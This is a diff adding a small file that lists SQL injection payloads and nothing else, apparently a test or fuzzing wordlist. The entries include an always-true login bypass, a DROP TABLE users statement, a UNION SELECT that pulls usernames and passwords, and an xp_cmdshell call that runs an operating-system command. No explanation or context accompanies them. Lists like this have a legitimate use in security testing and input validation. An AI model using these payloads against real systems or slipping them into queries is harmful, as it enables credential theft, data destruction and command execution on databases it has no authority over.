@@ -1,0 +1,11 @@
+SELECT * FROM users WHERE id='1' OR '1'='1'
+
+'; DROP TABLE users; --
+
+UNION SELECT username, password FROM users--
+
+1'; EXEC xp_cmdshell('dir') --
+
+admin'--
+
+' OR '1'='1' /*
